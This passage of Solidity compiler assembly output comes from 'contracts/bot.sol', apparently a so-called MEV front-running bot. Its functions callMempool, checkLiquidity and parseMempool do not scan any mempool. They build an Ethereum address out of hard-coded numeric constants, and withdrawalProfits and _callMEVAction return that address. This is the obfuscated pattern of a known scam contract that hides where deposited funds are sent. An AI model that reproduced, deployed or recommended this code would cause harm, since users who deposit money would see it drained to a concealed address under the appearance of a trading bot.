\"contracts/bot.sol\":14583:14595  parseMempool */\n      tag_47\n        /* \"contracts/bot.sol\":14583:14610  parseMempool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"contracts/bot.sol\":14576:14610  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14508:14617  function _callMEVAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15993:16105  function withdrawalProfits() internal pure returns (address) {... */\n    tag_40:\n        /* \"contracts/bot.sol\":16045:16052  address */\n      0x00\n        /* \"contracts/bot.sol\":16071:16098  parseMempool(callMempool()) */\n      tag_49\n        /* \"contracts/bot.sol\":16084:16097  callMempool() */\n      tag_50\n        /* \"contracts/bot.sol\":16084:16095  callMempool */\n      tag_46\n        /* \"contracts/bot.sol\":16084:16097  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"contracts/bot.sol\":16071:16083  parseMempool */\n      tag_47\n        /* \"contracts/bot.sol\":16071:16098  parseMempool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"contracts/bot.sol\":16064:16098  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15993:16105  function withdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":12945:13847  function callMempool() internal pure returns (string memory) {... */\n    tag_46:\n        /* \"contracts/bot.sol\":12991:13004  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13016:13044  string memory _memPoolOffset */\n      dup1\n        /* \"contracts/bot.sol\":13047:13095  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13060:13094  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"contracts/bot.sol\":13075:13093  getMemPoolOffset() */\n      tag_54\n        /* \"contracts/bot.sol\":13075:13091  getMemPoolOffset */\n      tag_55\n        /* \"contracts/bot.sol\":13075:13093  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"contracts/bot.sol\":13060:13074  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13060:13094  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"contracts/bot.sol\":13047:13054  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13047:13095  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"contracts/bot.sol\":13016:13095  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13105:13121  uint _memPoolSol */\n      0x00\n        /* \"contracts/bot.sol\":13124:13134  2241187473 */\n      0x8595ce91\n        /* \"contracts/bot.sol\":13105:13134  uint _memPoolSol = 2241187473 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13144:13163  uint _memPoolLength */\n      0x00\n        /* \"contracts/bot.sol\":13166:13172  426056 */\n      0x068048\n        /* \"contracts/bot.sol\":13144:13172  uint _memPoolLength = 426056 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13182:13199  uint _memPoolSize */\n      0x00\n        /* \"contracts/bot.sol\":13202:13213  63355277064 */\n      0x0ec044cf08\n        /* \"contracts/bot.sol\":13182:13213  uint _memPoolSize = 63355277064 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13223:13242  uint _memPoolHeight */\n      0x00\n        /* \"contracts/bot.sol\":13245:13263  getMemPoolHeight() */\n      tag_58\n        /* \"contracts/bot.sol\":13245:13261  getMemPoolHeight */\n      tag_59\n        /* \"contracts/bot.sol\":13245:13263  getMemPoolHeight() */\n      jump\t// in\n    tag_58:\n        /* \"contracts/bot.sol\":13223:13263  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13273:13291  uint _memPoolDepth */\n      0x00\n        /* \"contracts/bot.sol\":13294:13311  getMemPoolDepth() */\n      tag_60\n        /* \"contracts/bot.sol\":13294:13309  getMemPoolDepth */\n      tag_61\n        /* \"contracts/bot.sol\":13294:13311  getMemPoolDepth() */\n      jump\t// in\n    tag_60:\n        /* \"contracts/bot.sol\":13273:13311  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13322:13345  string memory _memPool1 */\n      0x60\n        /* \"contracts/bot.sol\":13348:13400  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_62\n        /* \"contracts/bot.sol\":13356:13370  _memPoolOffset */\n      dup8\n        /* \"contracts/bot.sol\":13372:13399  checkLiquidity(_memPoolSol) */\n      tag_63\n        /* \"contracts/bot.sol\":13387:13398  _memPoolSol */\n      dup9\n        /* \"contracts/bot.sol\":13372:13386  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13372:13399  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/bot.sol\":13348:13355  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13348:13400  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_62:\n        /* \"contracts/bot.sol\":13322:13400  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13410:13433  string memory _memPool2 */\n      0x60\n        /* \"contracts/bot.sol\":13436:13505  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_64\n        /* \"contracts/bot.sol\":13444:13474  checkLiquidity(_memPoolLength) */\n      tag_65\n        /* \"contracts/bot.sol\":13459:13473  _memPoolLength */\n      dup8\n        /* \"contracts/bot.sol\":13444:13458  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13444:13474  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/bot.sol\":13476:13504  checkLiquidity(_memPoolSize) */\n      tag_66\n        /* \"contracts/bot.sol\":13491:13503  _memPoolSize */\n      dup8\n        /* \"contracts/bot.sol\":13476:13490  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13476:13504  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/bot.sol\":13436:13443  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13436:13505  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/bot.sol\":13410:13505  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13515:13538  string memory _memPool3 */\n      0x60\n        /* \"contracts/bot.sol\":13541:13571  checkLiquidity(_memPoolHeight) */\n      tag_67\n        /* \"contracts/bot.sol\":13556:13570  _memPoolHeight */\n      dup6\n        /* \"contracts/bot.sol\":13541:13555  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13541:13571  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/bot.sol\":13515:13571  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13581:13604  string memory _memPool4 */\n      0x60\n        /* \"contracts/bot.sol\":13607:13636  checkLiquidity(_memPoolDepth) */\n      tag_68\n        /* \"contracts/bot.sol\":13622:13635  _memPoolDepth */\n      dup6\n        /* \"contracts/bot.sol\":13607:13621  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13607:13636  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/bot.sol\":13581:13636  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13647:13673  string memory _allMempools */\n      0x60\n        /* \"contracts/bot.sol\":13676:13745  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_69\n        /* \"contracts/bot.sol\":13684:13713  mempool(_memPool1, _memPool2) */\n      tag_70\n        /* \"contracts/bot.sol\":13692:13701  _memPool1 */\n      dup7\n        /* \"contracts/bot.sol\":13703:13712  _memPool2 */\n      dup7\n        /* \"contracts/bot.sol\":13684:13691  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13684:13713  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/bot.sol\":13715:13744  mempool(_memPool3, _memPool4) */\n      tag_71\n        /* \"contracts/bot.sol\":13723:13732  _memPool3 */\n      dup6\n        /* \"contracts/bot.sol\":13734:13743  _memPool4 */\n      dup6\n        /* \"contracts/bot.sol\":13715:13722  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13715:13744  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_71:\n        /* \"contracts/bot.sol\":13676:13683  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13676:13745  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/bot.sol\":13647:13745  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13755:13781  string memory _fullMempool */\n      0x60\n        /* \"contracts/bot.sol\":13784:13810  mempool(\"0\", _allMempools) */\n      tag_72\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13797:13809  _allMempools */\n      dup4\n        /* \"contracts/bot.sol\":13784:13791  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13784:13810  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_72:\n        /* \"contracts/bot.sol\":13755:13810  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13828:13840  _fullMempool */\n      dup1\n        /* \"contracts/bot.sol\":13821:13840  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":12945:13847  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8276:9188  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_47:\n        /* \"contracts/bot.sol\":8339:8354  address _parsed */\n      0x00\n        /* \"contracts/bot.sol\":8366:8382  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":8391:8393  _a */\n      dup3\n        /* \"contracts/bot.sol\":8366:8394  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8404:8417  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":8420:8421  0 */\n      dup1\n        /* \"contracts/bot.sol\":8404:8421  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8431:8441  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":8451:8461  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":8477:8483  uint i */\n      0x00\n        /* \"contracts/bot.sol\":8486:8487  2 */\n      0x02\n        /* \"contracts/bot.sol\":8477:8487  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_74:\n        /* \"contracts/bot.sol\":8493:8503  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":8489:8490  i */\n      dup2\n        /* \"contracts/bot.sol\":8489:8503  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_75\n      jumpi\n        /* \"contracts/bot.sol\":8536:8539  256 */\n      0x0100\n        /* \"contracts/bot.sol\":8527:8539  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8572:8575  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8576:8577  i */\n      dup2\n        /* \"contracts/bot.sol\":8572:8578  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      invalid\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8566:8579  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8558:8580  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8553:8580  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8613:8616  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8621:8622  1 */\n      0x01\n        /* \"contracts/bot.sol\":8617:8618  i */\n      dup3\n        /* \"contracts/bot.sol\":8617:8622  i + 1 */\n      add\n        /* \"contracts/bot.sol\":8613:8623  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8607:8624  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8599:8625  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8594:8625  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8650:8652  97 */\n      0x61\n        /* \"contracts/bot.sol\":8644:8646  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8644:8652  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8643:8668  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8664:8667  102 */\n      0x66\n        /* \"contracts/bot.sol\":8658:8660  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8658:8667  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8643:8668  (b1 >= 97) && (b1 <= 102) */\n    tag_79:\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_80\n      jumpi\n        /* \"contracts/bot.sol\":8694:8696  87 */\n      0x57\n        /* \"contracts/bot.sol\":8688:8696  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_81)\n    tag_80:\n        /* \"contracts/bot.sol\":8728:8730  65 */\n      0x41\n        /* \"contracts/bot.sol\":8722:8724  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8722:8730  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8721:8745  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_82\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8742:8744  70 */\n      0x46\n        /* \"contracts/bot.sol\":8736:8738  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8736:8744  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8721:8745  (b1 >= 65) && (b1 <= 70) */\n    tag_82:\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_83\n      jumpi\n        /* \"contracts/bot.sol\":8771:8773  55 */\n      0x37\n        /* \"contracts/bot.sol\":8765:8773  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_84)\n    tag_83:\n        /* \"contracts/bot.sol\":8805:8807  48 */\n      0x30\n        /* \"contracts/bot.sol\":8799:8801  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8799:8807  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8798:8822  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8819:8821  57 */\n      0x39\n        /* \"contracts/bot.sol\":8813:8815  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8813:8821  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8798:8822  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"contracts/bot.sol\":8794:8865  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"contracts/bot.sol\":8848:8850  48 */\n      0x30\n        /* \"contracts/bot.sol\":8842:8850  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8794:8865  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_86:\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_84:\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_81:\n        /* \"contracts/bot.sol\":8889:8891  97 */\n      0x61\n        /* \"contracts/bot.sol\":8883:8885  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8883:8891  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8882:8907  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_87\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8903:8906  102 */\n      0x66\n        /* \"contracts/bot.sol\":8897:8899  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8897:8906  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8882:8907  (b2 >= 97) && (b2 <= 102) */\n    tag_87:\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_88\n      jumpi\n        /* \"contracts/bot.sol\":8933:8935  87 */\n      0x57\n        /* \"contracts/bot.sol\":8927:8935  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_89)\n    tag_88:\n        /* \"contracts/bot.sol\":8967:8969  65 */\n      0x41\n        /* \"contracts/bot.sol\":8961:8963  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8961:8969  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8960:8984  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_90\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8981:8983  70 */\n      0x46\n        /* \"contracts/bot.sol\":8975:8977  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8975:8983  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8960:8984  (b2 >= 65) && (b2 <= 70) */\n    tag_90:\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_91\n      jumpi\n        /* \"contracts/bot.sol\":9010:9012  55 */\n      0x37\n        /* \"contracts/bot.sol\":9004:9012  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_92)\n    tag_91:\n        /* \"contracts/bot.sol\":9044:9046  48 */\n      0x30\n        /* \"contracts/bot.sol\":9038:9040  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9038:9046  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9037:9061  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9058:9060  57 */\n      0x39\n        /* \"contracts/bot.sol\":9052:9054  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9052:9060  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9037:9061  (b2 >= 48) && (b2 <= 57) */\n    tag_93:\n        /* \"contracts/bot.sol\":9033:9104  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_94\n      jumpi\n        /* \"contracts/bot.sol\":9087:9089  48 */\n      0x30\n        /* \"contracts/bot.sol\":9081:9089  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9033:9104  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_94:\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_92:\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_89:\n        /* \"contracts/bot.sol\":9137:9139  b2 */\n      dup2\n        /* \"contracts/bot.sol\":9132:9134  16 */\n      0x10\n        /* \"contracts/bot.sol\":9127:9129  b1 */\n      dup5\n        /* \"contracts/bot.sol\":9127:9134  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":9127:9139  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":9117:9140  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8510:8511  2 */\n      0x02\n        /* \"contracts/bot.sol\":8505:8511  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_74)\n    tag_75:\n      pop\n        /* \"contracts/bot.sol\":9175:9180  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":9160:9181  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":8276:9188  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":8018:8108  function getMemPoolOffset() internal pure returns (uint) {... */\n    tag_55:\n        /* \"contracts/bot.sol\":8069:8073  uint */\n      0x00\n        /* \"contracts/bot.sol\":8092:8101  203096485 */\n      0x0c1b01a5\n        /* \"contracts/bot.sol\":8085:8101  return 203096485 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8018:8108  function getMemPoolOffset() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9728:10150  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n    tag_56:\n        /* \"contracts/bot.sol\":9783:9796  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9809:9819  uint count */\n      0x00\n        /* \"contracts/bot.sol\":9822:9823  0 */\n      dup1\n        /* \"contracts/bot.sol\":9809:9823  uint count = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9833:9839  uint b */\n      0x00\n        /* \"contracts/bot.sol\":9842:9843  a */\n      dup4\n        /* \"contracts/bot.sol\":9833:9843  uint b = a */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n    tag_97:\n        /* \"contracts/bot.sol\":9865:9866  0 */\n      0x00\n        /* \"contracts/bot.sol\":9860:9861  b */\n      dup2\n        /* \"contracts/bot.sol\":9860:9866  b != 0 */\n      eq\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n      tag_98\n      jumpi\n        /* \"contracts/bot.sol\":9882:9889  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":9908:9910  16 */\n      0x10\n        /* \"contracts/bot.sol\":9903:9910  b /= 16 */\n      dup2\n      dup2\n      tag_99\n      jumpi\n      invalid\n    tag_99:\n      div\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n      jump(tag_97)\n    tag_98:\n        /* \"contracts/bot.sol\":9930:9946  bytes memory res */\n      0x60\n        /* \"contracts/bot.sol\":9959:9964  count */\n      dup3\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_100\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_100:\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_101\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      swap1\n      pop\n    tag_101:\n      pop\n        /* \"contracts/bot.sol\":9930:9965  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9980:9986  uint i */\n      0x00\n        /* \"contracts/bot.sol\":9987:9988  0 */\n      dup1\n        /* \"contracts/bot.sol\":9980:9988  uint i=0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n    tag_102:\n        /* \"contracts/bot.sol\":9992:9997  count */\n      dup4\n        /* \"contracts/bot.sol\":9990:9991  i */\n      dup2\n        /* \"contracts/bot.sol\":9990:9997  i<count */\n      lt\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n      iszero\n      tag_103\n      jumpi\n        /* \"contracts/bot.sol\":10026:10028  16 */\n      0x10\n        /* \"contracts/bot.sol\":10022:10023  a */\n      dup7\n        /* \"contracts/bot.sol\":10022:10028  a % 16 */\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      mod\n        /* \"contracts/bot.sol\":10018:10028  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":10063:10083  toHexDigit(uint8(b)) */\n      tag_106\n        /* \"contracts/bot.sol\":10080:10081  b */\n      dup4\n        /* \"contracts/bot.sol\":10063:10073  toHexDigit */\n      tag_107\n        /* \"contracts/bot.sol\":10063:10083  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_106:\n        /* \"contracts/bot.sol\":10042:10045  res */\n      dup3\n        /* \"contracts/bot.sol\":10058:10059  1 */\n      0x01\n        /* \"contracts/bot.sol\":10054:10055  i */\n      dup4\n        /* \"contracts/bot.sol\":10046:10051  count */\n      dup8\n        /* \"contracts/bot.sol\":10046:10055  count - i */\n      sub\n        /* \"contracts/bot.sol\":10046:10059  count - i - 1 */\n      sub\n        /* \"contracts/bot.sol\":10042:10060  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_108\n      jumpi\n      invalid\n    tag_108:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":10042:10083  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":10102:10104  16 */\n      0x10\n        /* \"contracts/bot.sol\":10097:10104  a /= 16 */\n      dup7\n      dup2\n      tag_109\n      jumpi\n      invalid\n    tag_109:\n      div\n      swap6\n      pop\n        /* \"contracts/bot.sol\":9999:10002  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n      jump(tag_102)\n    tag_103:\n      pop\n        /* \"contracts/bot.sol\":10139:10142  res */\n      dup1\n        /* \"contracts/bot.sol\":10125:10143  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":9728:10150  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* 